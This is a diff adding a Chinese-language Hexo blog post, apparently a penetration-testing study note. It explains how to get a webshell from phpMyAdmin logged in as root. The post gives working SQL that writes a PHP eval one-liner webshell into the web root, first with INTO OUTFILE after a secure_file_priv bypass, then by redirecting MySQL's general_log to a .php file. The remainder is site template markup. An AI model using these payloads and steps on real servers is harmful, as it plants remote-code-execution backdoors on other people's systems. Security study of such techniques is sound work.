@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>phpmyadmin,getshell的方法 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content>
+  <meta name="description" content>
+  <link rel="shortcut icon" href="/favicon.ico">
+  <link rel="stylesheet" href="/css/main.css"> <link rel="stylesheet" href="/css/style.css"> <link rel="stylesheet" href="/css/menu.css"> 
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.jside.menu.js"></script>
+	<script>
+	$(document).ready(function(){
+	$(".menu-container").jSideMenu({
+	    jSidePosition: "position-right",
+	    jSideSticky: true,
+	    jSideSkin: "moonlit",
+	     });
+	}); 
+	</script>
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+  
+</head>
+<body>
+<div class="single">
+<div id="page">
+<div id="lx-aside" style="background-image: url(/images/page-cover.jpg)" data-stellar-background-ratio="0.5">
+  <div class="overlay">
+  <div class="page-title">
+    <div class="avatar"><img src="/images/person_1.jpg"></div>
+    <span>2019-10-23</span>
+    <h2>phpmyadmin,getshell的方法</h2>
+    </div>
+</div>
+</div>
+<div id="lx-main-content">
+  <div class="lx-post"> 
+    <div class="lx-entry padding">
+      <div>
+        <h2 id="phpmyadmin，getshell的方法"><a href="#phpmyadmin，getshell的方法" class="headerlink" title="phpmyadmin，getshell的方法"></a>phpmyadmin，getshell的方法</h2><p>getshell前提：phpmyadmin以root权限登陆。</p>
+<h3 id="Phpmyadmin-getshell一般情况下，有两种操作方式："><a href="#Phpmyadmin-getshell一般情况下，有两种操作方式：" class="headerlink" title="Phpmyadmin getshell一般情况下，有两种操作方式："></a>Phpmyadmin getshell一般情况下，有两种操作方式：</h3><h4 id="1、sql语句into-outfile写入getshell（前提：需要知道网站根目录）"><a href="#1、sql语句into-outfile写入getshell（前提：需要知道网站根目录）" class="headerlink" title="1、sql语句into outfile写入getshell（前提：需要知道网站根目录）"></a>1、sql语句into outfile写入getshell（前提：需要知道网站根目录）</h4><p>​      执行 Select “<?php @eval($_POST['pass'])?>“ into outfile         “C:/phpStudy/PHPTutorial/WWW/a.php”; </p>
+<p>会出现 // #1290 -The MYSQL server is running with the –secure-file-priv  option so it cannot execute this statement 错误，原因是mysql正在使用–secure-file-priv选项运行，所以它无法执行这条sql语句。</p>
+<p>  Show global variables like “%secure_file_priv%”    //查看secure_file_priv文件的配置情况 </p>
+<p> Secure_file_priv为NULL时，mysql不允许导入导出</p>
+<p>Secure_file_priv为/tmp时，mysql只能在/tmp目录中执行导入导出</p>
+<p>Secure_file_priv没有值时，不限制mysql的导入导出。</p>
+<p> 想要into outfile写入数据就需要在mysql文件夹下修改my.ini文件，在my.ini文件中加入secure_file_priv=””，就可以实现into outfile写入数据了。</p>
+<h5 id="sql语句into-outfile和into-dumpfile的区别："><a href="#sql语句into-outfile和into-dumpfile的区别：" class="headerlink" title="sql语句into outfile和into dumpfile的区别："></a>sql语句into outfile和into dumpfile的区别：</h5><p>into outfile函数会在行末端写入新行，还会转义换行符，就会破坏二进制文件。</p>
+<p> into dumpfile可以完整的导出一个二进制文件。因为into dumpfile函数不对任何列或者行进行终止，也不执行任何转义处理。</p>
+<h4 id="2、Mysql日志写webshell"><a href="#2、Mysql日志写webshell" class="headerlink" title="2、Mysql日志写webshell"></a>2、Mysql日志写webshell</h4><p>mysql每执行一个语句，就会把sql语句写入到日志文件中，但是默认情况下，这个选项时关闭的。</p>
+<p>因此，需要去开启这个选项，再设置日志路径，日志路径设置为网站根目录，日志文件名字改为.php结尾的文件。</p>
+<p>Show  global  variables like “%genera%”;      //查询general文件的配置情况.</p>
+<p>Set   global general_log=’on’;            //开启general log日志。</p>
+<p>Set  global general_log_file=’C:/phpStudy/PHPTutorial/WWW/500.php’;       //设置日志文件保存路径。</p>
+<p>执行任意的sql语句，就能把内容存储到.php文件中。</p>
+<p>​    select  “<?php @eval ($_POST[' pass'] ?>“;      //一句话写入日志文件。</p>
+<p>​    set global general_log=’off’;       //关闭general_log日志 </p>
+<p>​    </p>
+<h5 id="phpmyadmin，getshell的核心："><a href="#phpmyadmin，getshell的核心：" class="headerlink" title="phpmyadmin，getshell的核心："></a>phpmyadmin，getshell的核心：</h5><p>​                         1、找到网站的绝对路径</p>
+<p>​                         2、执行sql语句。</p>
+
+      </div>
+    </div>		
+  </div>
+</div>
+<div class="lx-navigation">
+	<div class="lx-cover prev lx-cover-sm" style="background-image: url(/images/footer_1.jpg)">
+		<div class="overlay"></div>
+		<a class="copy" href="#">
+			<div class="display-t">
+				<div class="display-tc">
+					<div>
+						<span>Next</span>
+						<h3>没有更新的文章</h3>
+					</div>
+				</div>
+			</div>
+		</a>
+	</div>
+        <div class="lx-cover next lx-cover-sm" style="background-image: url(/images/footer_2.jpg)">
+		<div class="overlay"></div>
+		<a class="copy" href="/2019/09/23/upload-loads1-13关/">
+			<div class="display-t">
+				<div class="display-tc">
+					<div>
+						<span>Prev</span>
+						<h3>upload-loads1-13关</h3>
+					</div>
+				</div>
+			</div>
+		</a>
+	</div>
+</div>
+</div>
+
+<footer>
+  <div>
+  Copyright &copy; 2019.<a href="/">Hexo</a><br>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme <a href="https://lx.blleng.cn" target="_blank">Lx</a><br>
+  </div>
+</footer>
+</div>
+<button class="menu-trigger"></button>
+  <div class="menu">
+	<div class="menu-head">
+	   <span class="layer">
+	<div class="col">
+	  <div class="row for-pic">
+	   <div class="profile-pic">     
+	   <img src="/images/person_1.jpg" alt="Asif Mughal"> 
+	         </div>
+	  </div>
+	         <div class="row for-name">
+	         <p>John Doe</p>
+	        <span class="tagline">Hello, World!</span>
+	          </div>
+	         </div> 
+	  </span>
+	</div>
+	<nav class="menu-container">
+	<ul class="menu-items">
+	<li><span class="item-icon"><i class="fa fa-home"></i></span> <a href="/">首页</a></li>
+  <li><span class="item-icon"><i class="fa fa-archive"></i></span> <a href="/archives/">归档</a></li> 
+	<li class="has-sub"> <span class="item-icon"> <i class="fa fa-bookmark"></i> </span>
+	<span class="dropdown-heading">页面</span><ul>
+   <li> <a href="/guestbook">留言</a></li><li> <a href="/about">关于</a></li>
+	  </ul>
+	 </li>
+    <li class="has-sub"> <span class="item-icon"> <i class="fa fa-link"></i> </span>
+	 <span class="dropdown-heading">友链</span><ul>
+   <li> <a href="https://lx.blleng.cn" target="_blank">Theme-Lx</a></li>
+	  </ul>
+	 </li>
+	</ul>
+	</nav>
+  </div>
+<div class="gototop js-top">
+  <a href="#" class="js-gotop"><i class="fa fa-arrow-up"></i></a>
+</div>
+
+
+<script src="/js/jquery.easing.min.js"></script>
+<script src="/js/jquery.waypoints.min.js"></script>
+<script src="/js/jquery.stellar.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+</body>
+</html>
